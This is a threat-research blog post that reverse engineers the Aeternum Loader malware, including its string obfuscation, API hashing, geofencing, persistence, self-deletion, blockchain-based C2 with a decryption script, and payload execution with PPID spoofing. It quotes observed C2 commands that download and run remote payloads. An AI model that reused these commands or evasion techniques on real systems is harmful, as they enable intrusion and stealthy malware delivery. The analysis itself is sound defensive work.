---
title: "Aeternum Loader: Reversing"
classes: wide
header:
  teaser: /assets/images/block/logo.png
ribbon: black
description: "Decrypting and analysing"
categories:
  - Threat Research
tags:
  - Threat Research
toc: true
---

# Aeternum Loader Analysis

In our first blog, we analysed exposed source-code of Aeternum Loader and extracted Command & Control (C2) communications from multiple deployments of this loader that were on the blockchain. We discovered there was a weakeness in the encryption implementation of C2 communications that could allow decryption of all C2 comms, if we could get our hands on threat actors smart contract addresses. 

In order to get a smart contract address, we needed a build of Aeternum Loader. We brushed over the detail of actually getting that first contract address, which took time and persistence. In this blog, we'll tell the story of getting our hands on a build, trying to test it in real time with `LenAI` & finally reversing it to extract the contract address.  

## Getting a build

We posed as a potential buyer of Aeternum Loader, asking questions about the product and it's features:

[![1](/assets/images/block/47.png)](/assets/images/block/47.png){: .full}

Eventually, we got a build:

[![1](/assets/images/block/48.png)](/assets/images/block/48.png){: .full}

I troubleshooted with `LenAI` as the loader was not working successfully. We tried a build without the Anti-VM capability, and this installed - although I didn't see the expected `putty.exe` as he indicated:

[![1](/assets/images/block/49.png)](/assets/images/block/49.png){: .full}

Regardless, our goal was complete. We had a build which we knew **must** contain a contract address. The binary sent via `LenAI` was UPX packed, although this could be unpacked with `upx -d`. The Aeternum Loader binary also uses multiple obfuscation and evasion technqiues to hinder analysis, which we will discuss.   

## String obfuscation

Aeternum Loader uses per-string XOR obfuscation using unique keys. The obfuscated bytes live within the binaries `.data` section, and are dynamically decrypted by each function that uses them. 

Within the IDA it was clear to spot where XOR decryption was occuring. You'd either see successive XOR operations or a loop iterating through the bytes performing XOR operations:

**Example 1**:

[![1](/assets/images/block/12.png)](/assets/images/block/12.png){: .full}  

In the above example, we've named the 4 bytes `byte_443A21` ... `byte_443A24` the "encrypted bytes" and `byte_443A26` ... `byte_443A29` the "key bytes". At runtime (guarded by a “decoded” flag so it only happens once), each function will recovers plaintext strings by XORing each encrypted byte with the corresponding key byte at the same index, overwriting the encrypted bytes: `enc[i] = enc[i] XOR key[i]`.

**Example 2**:

[![1](/assets/images/block/13.png)](/assets/images/block/13.png){: .full}   

This example is very similar, although we just observed a *for loop* that iterated through the decryption process of strings. In both of the above, it was possible to do manually - but it was tedious to do at scale. We wanted to somehow speed the process of extracting the strings.

[![1](/assets/images/block/14.png)](/assets/images/block/14.png){: .full}   

When examining the encrypted bytes and their corresponding keys in a hexdump, we noticed a consistent structure we could leverage. First, we established that each pair is the same length: `len(ENC_n) = len(KEY_n)`. We also observed that, in the raw binary, the data is laid out like:

```python
[...] 00 00 00 [ENC] 00 [KEY] 00 00 00 [ENC_1] 00 [KEY_1] 00 00 00 [...]
```

In other words, the encrypted bytes and key bytes (which are same length) are separated by a single null byte (`00`), which acts as a clear delimiter between the two. Surrounding each pair is a triple-null boundary (`00 00 00`): three null bytes appear immediately before the encrypted bytes and again immediately after the key bytes, effectively framing each ENC/KEY entry and making it straightforward to locate and carve consecutive pairs from the blob.

We can use an LLM to whip up a Python script that carves this pattern from the `.data` section, dumping raw strings, revealing some juicy information:

[![1](/assets/images/block/15.png)](/assets/images/block/15.png){: .full}   

Here we can see large lists of Polygon RPC URLs that would be used to make requests to the Smart Contract address hard-coded within the strings - `0x4d70C3393C5d9EC325Edf8b3f289cFA9777e64B0`.

## Dynamic Windows API resolution

Aeternum Loader attempts to obfuscate imported some Win32 API functions via dynamic resolution. We observed the actor use API hashing, using multiple algorithms, to dynamically lookup function names rather than storing them in clear text. 

**CRC32**

The main API hashing algorithm works by loading the relevant module, which was `kernel32.dll` each time the function was called. The algorithm will then locate the DLLs export directory and iterate through this, computing a CRC32 hash of the function name:

[![1](/assets/images/block/16.png)](/assets/images/block/16.png){: .full}   

We can see this function is called multiple times, each time with a hash as the parameter:

[![1](/assets/images/block/17.png)](/assets/images/block/17.png){: .full}

It's posssible to use a Python script to create the CRC32 hashing algorithm, and match the corresponding hashes:

```python
def api_crc32(s): # Function name as input
    c=0xFFFFFFFF
    for b in s.encode("ascii"):
        c^=b
        for _ in range(8):
            c=(c>>1)^(POLY if c&1 else 0)
            c&=0xFFFFFFFF
    return (~c)&0xFFFFFFFF
```   

This can speed up the process of resolving function names to hashes:

[![1](/assets/images/block/18.png)](/assets/images/block/18.png){: .full}

**DJB2**

The loader has the ability to reflectively load payloads from memory. Within this capability, which we will get to later, we also observed DJB2 API hashing to obfuscate imported functions. Like before, we can recreate the algorithm within Python:

```python
def djb2_hash(function_name):
    hash_value = 112186
    for char in function_name:
        hash_value = ord(char) + 33 * hash_value
    return hash_value & 0xFFFFFFFF
``` 
[![1](/assets/images/block/30.png)](/assets/images/block/30.png){: .full}

Similarly, we can retrieve the relevant resolved function names:

[![1](/assets/images/block/31.png)](/assets/images/block/31.png){: .full}

## Country geo-fencing checks

Within the main payload we can see the function `FUN_004126f0()` is called before any actions actually take place. Looking inside this function we can see the following:

[![1](/assets/images/block/26.png)](/assets/images/block/26.png){: .full}

Breaking down the functionality we can see this function sets out to achieve the following:

`GetSystemDefaultLangID()` - Checks system language
`GetUserDefaultLangID()` - Checks user language

Uses a registry line check to see if control panel code identifier is set to `0x419` (Russia)

```c
if ((LVar2 != 0x419) && (LVar3 != 0x419)) {
    LVar4 = RegOpenKeyExW((HKEY)0x80000002, L"Control Panel\\International", 0, 0x20019, &local_cc);
```

Reads `LocaleName` from registry and compares against a blacklist at 'DAT_00435390' (Russia)

```c
if (LVar4 == 0) {
    __memset(local_c8, 0, 0xaa);
    local_d0 = 0xaa;
    LVar4 = RegGetValueW(local_cc, (LPCWSTR)0x0, L"LocaleName", 2, (LPDWORD)0x0, local_c8, &local_d0);
    RegCloseKey(local_cc);
    if (LVar4 == 0) {
        pauVar5 = FUN_00417450((undefined1 (*)[16])local_c8, (undefined1 (*)[16])&DAT_00435390);
        if (pauVar5 != (undefined1 (*)[16])0x0) goto LAB_00412d30;
    }
}
```

Overall meaning the malware performs checks on the host to confirm if the device/user is from Russia and if so seizes termination. Interestingly, doesn't appear to check for other common CIS/former-Soviet countries that malware often avoids.


## Installation & Persistence

If Aeternum loader passes the Anti-VM and Russia geofencing checks, it'll begin an installation process to establish persistence. This involves using the Win32 resolved API function `GetModuleFileNameA()` to retrieve the full file path of the original binary. Aeternum Loader is then copied to `AppData\Local`, persisting via the Startup folder. 

| Type            | File Path                                                                                                            |
|-----------------|----------------------------------------------------------------------------------------------------------------------|
| Aeternum Loader | `C:\Users\[USER]\AppData\Local\wmi[HOST_ID]\wmi_[HOST_ID].exe`                                                       |
| Persistence     | `C:\Users\[USER]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\[AUTORUN_NAME]wmi[HOST_ID].lnk` |

The "HOST_ID" strings are the MD5 hash of the `C:`-volume serial number. The above `.lnk` is attempting to persist the core Aeternum Loader module. Later, when we inspect the loader's capabilties - we'll observe dropped payloads also can be configured to persist via the Startup folder. 

**Installation:**

[![1](/assets/images/block/33.png)](/assets/images/block/33.png){: .full} 

**Persistence:**

[![1](/assets/images/block/34.png)](/assets/images/block/34.png){: .full}


### Self Deletion

Aeternum uses self-deletion technique that leverages NTFS Alternate Data Streams (ADS) to achieve anti-forensic objectives. The technique which first originated as a POC on Github (https://github.com/LloydLabs/delete-self-poc) is now being used in malware to enable executables to delete themselves after execution, complicating incident response and forensic analysis efforts. 

The routine executes after the malware has completed its primary payload delivery, specifically after copying itself to a persistence location. To begin with, the malware retrieves its own executable path using `GetModuleFileNameW`. 

[![1](/assets/images/block/27.png)](/assets/images/block/27.png){: .full}

After that, the malware constructs a `FILE_RENAME_INFO` structure programmatically, encoding the target stream name character by character:

[![1](/assets/images/block/28.png)](/assets/images/block/28.png){: .full}

The rename operation creates NTFS journal entries showing the file was renamed to an ADS, but the original file content becomes inaccessible through normal file system traversal. Recovery of the malware binary becomes dependent on capturing process memory before termination, as the file system no longer contains the executable.

While any ADS name would work technically, this specific string `":wtfbbq"` has been seen before, leveraged via [Latrodectus](https://www.elastic.co/security-labs/spring-cleaning-with-latrodectus) and [MuddyWater's StealthCache](https://www.group-ib.com/blog/muddywater-infrastructure-malware/).


## Command & Control

Once installed, it'll start the beaconing process in order to retrieve encrypted comands. Specifically, a Mersenne Twister-like PRNG is leveraged to create beacon jitter, with a random delay of 1 to 3 minutes. Aeternum Loader attempts to achieve redundancy using a hardcoded list of over [Polygon RPC domains](https://github.com/ctrlaltint3l/intelligence/blob/main/Aeternum%20Loader/PolygonRPC.txt).

### Polygon RPC for C2

The contract address, `0x4d70C3393C5d9EC325Edf8b3f289cFA9777e64B0`, was XOR encrypted and used with the smart contract's `getDomain()` function export address `0xb68d1809` in order to retrieve C2 commands. `POST` requests were made to the C2 using the below parameters:

```
POST / HTTP/1.1
Host: <polygon-rpc-host>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/json

{"jsonrpc":"2.0","method":"eth_call","params":[{"to":"0x4d70C3393C5d9EC325Edf8b3f289cFA9777e64B0","data":"0xb68d1809"},"latest"],"id":1}
```

This would return JSON, and within the `result` value is the encrypted command:

```
{"jsonrpc":"2.0","id":1,"result":"0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000ba363137383665353434373431333736343633326235353262366434313530343333613734363337313634333733363664373833383534333032623431363532623535326634363432363236643434343237313737363734343431353836643531373937383466333335333339363233353438353037343464353033393661343433303437346236363334363536333535353433323461356137343761343437353461373434373435363336333531373336613735363936663364000000000000"}
```

We can remove the padding and hex decode this twice to reveal the encrypted command:

[![1](/assets/images/block/35.png)](/assets/images/block/35.png){: .full}

**Decrypting C2 commands**

The exposed data on the blockchain C2 is AES encrypted with a key derived from the contract address. This means you only need to know the contract address in order to decrypt all commands that have been sent to that particular "C2 server". We can use the below Python script to decrypt commands:

```python
import base64
import hashlib
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

def decrypt_command(contract_address, encrypted):
    iv_b64, ct_b64 = encrypted.split(":", 1) # Extract IV / ENC data

    iv = base64.b64decode(iv_b64)          # B64 decode IV 
    ciphertext = base64.b64decode(ct_b64)  # B64 decode ENC data

    
    addr = contract_address.lower().encode("utf-8")   
    kdf = PBKDF2HMAC(                             # Derive AES key from contract address
        algorithm=hashes.SHA256(), 
        length=32,            # 256 bits
        salt=addr,            # salt = contract address (same as password)
        iterations=100_000,
    )
    key = kdf.derive(addr)    # password = contract address


    aesgcm = AESGCM(key) 
    plaintext = aesgcm.decrypt(iv, ciphertext, None)  # AES decrypt


    return plaintext.decode("utf-8") #Plaintext command
```

We can do this at scale, I'll break down a few example commands we observed for this sample:

* `all:url:hXXps://rpc-framework-check[.]cfd/1.ps1` - Download and run PowerShell script `1.ps1` on all hosts
* `all:url:hXXps://github[.]com/ooocyber_bunerkdl/ttt/raw/refs/heads/main/123.exe` - Download and run `123.exe` on all hosts
* `hwid:fca8bdd1134497619285f4f9aba60817:url:hXXps://rpc-framework-check[.]cfd/123.exe` - Download and run `123.exe` on specific host 

## Loader

| Payload extension (from URL)      | Drop behavior                   | Notes                                                                                                             | Persistence behavior                                                       |
| --------------------------------- | ------------------------------- | ------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------- |
| `.dll`                        | **No drop** (reflective loading) | Manual-map/reflective-style load; RWX + `MEM_TOP_DOWN`; resolves imports/relocs; calls `DllMain`; may call a named export | N/A          |
| `.ps1`**                        |`%TEMP%\{RANDOM10}\{RANDOM10}.ps1`           | Removes MOTW (`:Zone.Identifier` ADS deletion); PowerShell runs hidden with ExecutionPolicy bypass + NoProfile            | If enabled: Startup folder `.lnk` pointing to dropped script |
| `.cmd` / `.bat`               | `%TEMP%\{RANDOM10}\{RANDOM10}.ps1`           | Removes MOTW; runs via `cmd.exe`; **PPID spoofing** to `explorer.exe`                                                     | If enabled: Startup folder `.lnk` pointing to dropped script               |
| `.exe` + all other extensions | `%TEMP%\{RANDOM10}\{RANDOM10}.ps1`           | Removes MOTW; **PPID spoofing** to `explorer.exe`                                    | If enabled: Startup folder `.lnk` pointing to dropped file                 |

### Reflective DLL Loading

If the Aeternum Loader is downloading a `.dll` payload, it will not write to disk, but rather reflectively load it within memory via Manual PE mapping.

Firstly, it checks whether the binary is a valid executable with "MZ" & "PE" header strings:

[![1](/assets/images/block/20.png)](/assets/images/block/20.png){: .full}

Then an area of memory is allocated with RWX permissions set to the size of the PE:

[![1](/assets/images/block/21.png)](/assets/images/block/21.png){: .full}

Since `VirtualAlloc` returns an arbitary address, the code processes the relocation table and remaps to the correct entry point. But in order to actually run the DLL within memory, it needs to import it's relevant functions. As mentioned earlier, dbj2 API hashing is used to resolve the functions for `LoadLibraryA`, `GetProcAddress` & `GetModuleHandleA`. These 3 functions are used to figure out the mapped PE's imports, then importing them dynamically. 

[![1](/assets/images/block/22.png)](/assets/images/block/22.png){: .full}

After loading relevant functions, the PE is executed:

[![1](/assets/images/block/23.png)](/assets/images/block/23.png){: .full}

### Writing payloads to disk

If the Aeternum Loader is **not** downloading a `.dll` payload (i.e. downloading `.exe`, `.ps1`, `.cmd` or `.bat`), it'll create a directory within `%TEMP%` with 10 random characters. Another 10 random characters are also choosen for the file name, and these are written to disk:

[![1](/assets/images/block/24.png)](/assets/images/block/24.png){: .full}

This will write the payload to disk in the directory `C:\Users\<username>\AppData\Local\Temp\[10 random chars]\[10 random chars].[ext]`. Following this, the Mark-Of-The-Web (MoTW) Alternate Data Stream (ADS), `Zone.Identifier`, will be deleted:

[![1](/assets/images/block/25.png)](/assets/images/block/25.png){: .full}

If the C2 command contains the argument `savestartupname`, it will also achieve persistence via an `.lnk` file, with the corresponding name.  

### Parent Process ID (PPID) Spoofing

All payloads that are written to disk are executed with PPID spoofing to make it appear malware is spawning from `explorer.exe`. The function does the following thing:

1. Enumerate running processes using `CreateToolhelp32Snapshot()` to identify `explorer.exe`

2. Open a handle to the parent using `OpenProcess(0x80, 0, CurrentProcesSId)` with parameter `0x80` -> `PROCESS_CREATE_PROCESS` 

3. Build `PROC_THREAD_ATTRIBUTE_LIST`

[![1](/assets/images/block/38.png)](/assets/images/block/38.png){: .full}

4. New process is spawned with spoofed parent, with dwCreationFlags `0x9080200` (`EXTENDED_STARTUPINFO_PRESENT`, `CREATE_NEW_PROCESS_GROUP` - required for PPID spoofing) & custom StartupInfo:

[![1](/assets/images/block/39.png)](/assets/images/block/39.png){: .full}
